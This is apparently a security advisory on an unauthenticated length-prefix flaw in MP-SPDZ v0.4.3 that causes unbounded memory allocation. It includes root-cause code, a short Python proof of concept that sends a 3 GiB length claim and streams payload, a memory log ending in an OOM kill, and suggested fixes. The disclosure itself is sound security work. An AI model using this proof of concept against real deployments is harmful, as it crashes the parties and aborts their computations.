# MP-SPDZ v0.4.3: Unauthenticated 32-bit Length Prefix Triggers Unbounded Memory Allocation (Remote DoS)

- **Vulnerability type**: Allocation of Resources Without Limits or Throttling (CWE-770);
  Uncontrolled Resource Consumption (CWE-400)
- **Affected product**: MP-SPDZ v0.4.3
- **Affected components**: `octetStream::Receive` (`Tools/octetStream.h:509-519`) and all
  network entry points using it, including the pre-authentication client-id read in
  `ServerSocket::wait_for_client_id` (`Networking/ServerSocket.cpp:113-130`), the party
  receiver threads (`Networking/Receiver.cpp:69`), and the coordination-list read
  (`Networking/Player.cpp:167`)
- **Severity**: High (CVSS 3.1 estimate: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

## Summary

MP-SPDZ's wire format is `4-byte little-endian length + raw payload`. On receive, the length
field is attacker-controlled and is used **directly** as an allocation size with no sanity cap,
before a single payload byte (or any authentication) is required. A 4-byte message
(`FF FF FF FF`) forces the victim to allocate up to ~4 GiB; streaming payload afterwards turns
the virtual allocation into real RSS until the process is OOM-killed. On the accept path this
runs in a detached thread before any authentication, and an escaping exception terminates the
whole party process.

## Root Cause

```cpp
// Tools/octetStream.h:509-519
template<class T>
inline void octetStream::Receive(T socket_num)
{
  size_t nlen=0;
  receive(socket_num,nlen,LENGTH_SIZE);   // LENGTH_SIZE = 4 → nlen up to 0xFFFFFFFF
  set_length(0);
  resize_min(nlen);                        // → resize_precise → new octet[nlen]; NO cap
  set_length(nlen);
  receive(socket_num,data,get_length());   // only now is any payload needed
  reset_read_head();
}
```

Pre-authentication reachability:

```cpp
// Networking/ServerSocket.cpp:113-130
void ServerSocket::wait_for_client_id(int socket, struct sockaddr dest)
{
  try {
      octetStream client_id;
      client_id.Receive(socket);          // attacker length prefix, before ANY authentication
      process_connection(socket, client_id.str());
  }
  catch (closed_connection&) { ... }       // only this type is caught; bad_alloc → terminate
}
```

The receiving socket at this stage has no timeout (the 300 s timeout is only set later in
`PlainPlayer::setup_sockets`, Player.cpp:342-353), so the attacker can keep the connection
open indefinitely while trickling payload.

## Attack Preconditions

- Network reachability to any listening party port or the coordination server port. No
  credentials, no protocol participation, no race.

## Impact

- Reliable remote memory-exhaustion DoS: one 4-byte message → up to ~4 GiB allocation; the
  allocation is per connection, so it stacks.
- Process termination of honest parties (OOM kill, or `std::terminate`/`exit(1)` from uncaught
  exceptions), aborting the entire MPC computation at will.

## Proof of Concept (dynamically verified)

**Victim:** `./Server.x 2 18000` (baseline RSS ≈ 6 MB).

**Attacker** (`poc3c_slow.py`):

```python
s = socket.create_connection((host, 18000))
s.sendall(struct.pack("<I", 3221225472))     # 3 GiB claim, 4 bytes total
chunk = b"A" * (64 << 20)
while sent < length:                          # slow payload stream
    s.sendall(chunk); time.sleep(0.05)
```

**Observed victim RSS sampled every 100 ms** (raw log `poc3-rss.log`):

```
t=100ms  RSS=6052 kB       ← baseline
t=400ms  RSS=6052 kB       ← 4-byte prefix consumed; virtual allocation done
t=500ms  RSS=71608 kB      ← payload starts touching pages
t=1000ms RSS=602040 kB
t=1500ms RSS=1120184 kB
t=2000ms RSS=1644472 kB
t=2500ms RSS=2103224 kB
t=3000ms RSS=3340296 kB
t=3500ms RSS=4405352 kB
t=4000ms RSS=5756904 kB
t>4s     PROCESS_DEAD      ← OOM-killed; no error message, no peer notification
```

Control experiment (prefix only, no payload): `VmSize` immediately shows a ~3 GiB virtual
allocation while RSS stays flat — proving the allocation is caused solely by the 4
attacker-controlled bytes, before any payload is required.

## Static Verification

```bash
sed -n 509,519p Tools/octetStream.h        # Receive: no cap on nlen
sed -n 313,340p Tools/octetStream.h        # resize_min → resize_precise → new octet[l]
sed -n 113,130p Networking/ServerSocket.cpp  # pre-auth Receive on accept path
```

## Suggested Fix

- Enforce a hard cap in `octetStream::Receive` before `resize_min`, e.g.
  `if (nlen > MAX_MESSAGE_SIZE) throw invalid_length(...)`, and close the offending connection.
- Set a receive timeout on accepted sockets before reading the client id.
- Catch all exceptions in `ServerJob::run`/`wait_for_client_id` so a malformed client only
  closes its own connection.

## References

- MP-SPDZ repository: https://github.com/data61/MP-SPDZ

## Discoverer

*(to be filled by reporter)*
